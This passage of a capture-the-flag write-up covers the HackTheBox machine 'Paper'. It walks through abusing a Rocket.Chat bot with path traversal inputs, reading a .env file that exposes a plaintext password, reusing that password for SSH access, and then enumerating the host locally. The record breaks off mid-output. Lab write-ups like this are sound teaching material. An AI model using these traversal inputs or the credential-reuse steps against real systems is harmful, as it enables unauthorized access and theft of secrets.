+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143 chat.office.paper<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>Now let's see what this subdomain holds by browsing to <code>http://chat.office.paper/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-homepage.png" alt="Subdomain homepage" /></p>
+<p>This is likely the private chat system mentioned by the company earlier! The logo indicates that it's probably using <a href="https://www.rocket.chat/">Rocket.Chat</a>. This website also states that the 'Registration can only be done using the secret registration URL!', luckily we got that URL from the WordPress draft.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-registration-page.png" alt="Subdomain registration page" /></p>
+<p>Now we can create an account. I'll create a fake one as <code>foo</code>, and I'll press 'Register a new account'.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-logged-in-homepage.png" alt="Subdomain logged in homepage" /></p>
+<p>We successfully created an account! We only have access to a single channel, <code>#general</code>. Let's see what it contains.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-general-channel-content.png" alt="Subdomain #general channel content" /></p>
+<p>From what we can see, there's not much.</p>
+<h2 id="recyclops"><code>recyclops</code></h2>
+<p>But if we scroll up the history of messages, we see the mention of a <code>recyclops</code> bot that we can use to retrieve the content of files in the <code>Sales</code> folder.</p>
+<p>The problem is that this channel is read-only. But if we read carefully the messages, <code>kellylikescupcakes</code> mentions that we can interact with it through direct messages!</p>
+<p>Let's try to send <code>recyclops help</code> and see what happens.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/recyclops-bot-help-output.png" alt="'recyclops' bot output when 'recyclops help' is entered" /></p>
+<p>That's the same message we saw on the <code>#general</code> channel.</p>
+<p>If we enter <code>recyclops list</code>, we get the directory listing of the <code>sales</code> folder.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/recyclops-bot-list-output.png" alt="'recyclops' bot output when 'recyclops list' is entered" /></p>
+<p>Let's try to enter a random folder and see what happens:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/recyclops-bot-error-output.png" alt="'recyclops' bot output when 'recyclops list randomFolder' is entered" /></p>
+<p>We get an error, which discloses that this bot reads the content of <code>/home/dwight/sales/</code>. That's good to know.</p>
+<h2 id="path-traversal">Path traversal</h2>
+<p>Let's check if this bot is vulnerable to a path traversal vulnererability by entering <code>recyclops list ../</code></p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/recyclops-bot-path-traversal-test-output.png" alt="'recyclops' bot output when 'recyclops list ../' is entered" /></p>
+<p>It works! We now have access to <code>dwight</code>'s home folder.</p>
+<p>We can see that it contains the <code>user.txt</code> file, but I'm not interested in that at the moment.</p>
+<p>I also looked into the <code>.ssh</code> folder, but it's empty.</p>
+<h2 id="lfi">LFI</h2>
+<p>Since this bot is vulnerable to path traversal, and since it can read files, we should be able to weaponize it to obtain a local file inclusion vulnerability.</p>
+<p>Let's retrieve the content of <code>bot_restart.sh</code> using <code>recyclops file ../bot_restart.sh</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Cleaning hubot&#39;s log so that it won&#39;t grow too large.</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> /home/dwight/hubot/.hubot.log</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> For starting the bot 20-ish (10+20) seconds late, when the server is restarted.</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> This is because MongoDB and Rocket-Chat server needs some time to startup properly</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sleep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 10s</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Checks if Hubot is running every 10s</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-while z-shell">while</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> 1 <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> 
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-do z-shell">do</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sleep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 20s</span>
+</span><span class="z-source z-shell z-bash"><span class="z-variable z-other z-readwrite z-assignment z-shell">alive</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/sbin/ss</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>tulnp</span></span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 8000</span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span>  <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>n</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">alive</span></span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-variable z-other z-readwrite z-assignment z-shell">err</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>unhandled-rejections=strict<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> /home/dwight/hubot/.hubot.log</span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>n</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">err</span></span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Restarts bot</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[-] Bot not running! <span class="z-meta z-group z-expansion z-command z-backticks z-shell"><span class="z-punctuation z-section z-group z-begin z-shell">`</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-punctuation z-section z-group z-end z-shell">`</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">Killing the old process</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                <span class="z-variable z-other z-readwrite z-assignment z-shell">pid</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ps</span></span><span class="z-meta z-function-call z-arguments z-shell"> aux</span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>hubot -a rocketchat<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> grep</span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span> <span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f6</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> 
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-kill z-shell">kill</span></span><span class="z-meta z-function-call z-arguments z-shell"> -9 <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">pid</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Cleaning hubot&#39;s log so that it won&#39;t grow too large.</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> /home/dwight/hubot/.hubot.log</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">bash</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot/start_bot.sh</span><span class="z-keyword z-operator z-logical z-job z-shell">&amp;</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-else z-shell">else</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[+] Bot running succesfully! <span class="z-meta z-group z-expansion z-command z-backticks z-shell"><span class="z-punctuation z-section z-group z-begin z-shell">`</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-punctuation z-section z-group z-end z-shell">`</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-else z-shell">else</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Restarts bot</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[-] Bot not running! <span class="z-meta z-group z-expansion z-command z-backticks z-shell"><span class="z-punctuation z-section z-group z-begin z-shell">`</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-punctuation z-section z-group z-end z-shell">`</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">Killing the old process</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                <span class="z-variable z-other z-readwrite z-assignment z-shell">pid</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ps</span></span><span class="z-meta z-function-call z-arguments z-shell"> aux</span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>hubot -a rocketchat<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> grep</span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span> <span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f6</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> 
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-kill z-shell">kill</span></span><span class="z-meta z-function-call z-arguments z-shell"> -9 <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">pid</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span><span class="z-source z-shell z-bash">                <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">bash</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot/start_bot.sh</span><span class="z-keyword z-operator z-logical z-job z-shell">&amp;</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-end z-shell">done</span>
+</span></code></pre>
+<p>So this script basically kills the bot process, cleans up the log file, and launches the <code>/home/dwight/hubot/start_bot.sh</code> file, probably to start the bot.</p>
+<p>What's really interesting to us is that it mentions a MongoDB database and a Rocket-Chat server, so we can assume that Rocket.Chat stores its credentials in MongoDB.</p>
+<p>But we also notice that the launch script and log file are stored in the <code>hubot</code> folder in <code>/home/dwight</code>. That's really intriguing, I've never seen a folder with that name before. Let's search on Internet for this name:</p>
+<blockquote>
+<p>Hubot is your friendly robot sidekick. Install him in your company to dramatically improve employee efficiency.</p>
+<p>— <a href="https://hubot.github.com/">Hubot</a></p>
+</blockquote>
+<p>So this is the technology used to develop this bot! It must contain interesting information, let's explore it.</p>
+<h2 id="exploring-hubot">Exploring <code>hubot</code></h2>
+<p>Let's use the path traversal vulnerability to explore the content of this folder.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/recyclops-explore-hubot-folder.png" alt="Using the 'recyclops' bot to explore the 'hubot' folder" /></p>
+<p>It contains a few files, including <code>.env</code>. This type of file is usually used to store secrets, so let's retrieve its content.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/recyclops-get-env-file-content.png" alt="Using the 'recyclops' bot to get the'.env' file content" /></p>
+<p>Bingo! It contains a few secrets variables, and one is named <code>ROCKETCHAT_PASSWORD</code>! Its value is <code>Queenofblad3s!23</code>.</p>
+<p>It might be worth checking for credentials reuse, maybe <code>dwight</code> uses the same password to connect to his account.</p>
+<h2 id="ssh-port-22-tcp">SSH (port <code>22/tcp</code>)</h2>
+<p>During the <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#tcp-port-scanning">TCP port scanning</a> phase, we discovered that Paper was accepting connections over SSH. Let's try to connect as <code>dwight</code> using the password we just discovered.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh dwight@10.10.11.143</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.143 (10.10.11.143)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">Warning: Permanently added &#39;10.10.11.143&#39; (ED25519) to the list of known hosts.
+</span><span class="z-text z-plain">dwight@10.10.11.143&#39;s password: 
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[dwight@paper ~]$
+</span></code></pre>
+<p>It worked! Now we have a foothold into Paper.</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>dwight</code>.</p>
+<h2 id="distribution">Distribution</h2>
+<p>Let's see which distribution Traceback is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat /etc/os-release</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">NAME=&quot;CentOS Linux&quot;
+</span><span class="z-text z-plain">VERSION=&quot;8&quot;
+</span><span class="z-text z-plain">ID=&quot;centos&quot;
+</span><span class="z-text z-plain">ID_LIKE=&quot;rhel fedora&quot;
+</span><span class="z-text z-plain">VERSION_ID=&quot;8&quot;
+</span><span class="z-text z-plain">PLATFORM_ID=&quot;platform:el8&quot;
+</span><span class="z-text z-plain">PRETTY_NAME=&quot;CentOS Linux 8&quot;
+</span><span class="z-text z-plain">ANSI_COLOR=&quot;0;31&quot;
+</span><span class="z-text z-plain">CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;
+</span><span class="z-text z-plain">HOME_URL=&quot;https://centos.org/&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;
+</span><span class="z-text z-plain">CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;
+</span><span class="z-text z-plain">CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;
+</span></code></pre>
+<p>As was indicated by the default Apache installation page, Paper is using CentOS.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Paper's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel">Kernel</h2>
+<p>Maybe Paper is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.18.0-348.7.1.el8_5.x86_64
+</span></code></pre>
+<p>Unfortunately, the kernel version is recent too.</p>
+<h2 id="apparmor">AppArmor</h2>
+<p>Let's list the applications AppArmor profiles:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lap</span> /etc/apparmor.d/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ls: cannot access &#39;/etc/apparmor.d/&#39;: No such file or directory
+</span></code></pre>
+<p>Okay, so there's probably none!</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 ::1/128 scope host 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:6d:27 brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 dead:beef::250:56ff:feb9:6d27/64 scope global dynamic mngtmpaddr 
+</span><span class="z-text z-plain">       valid_lft 86400sec preferred_lft 14400sec
+</span><span class="z-text z-plain">    inet6 fe80::250:56ff:feb9:6d27/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
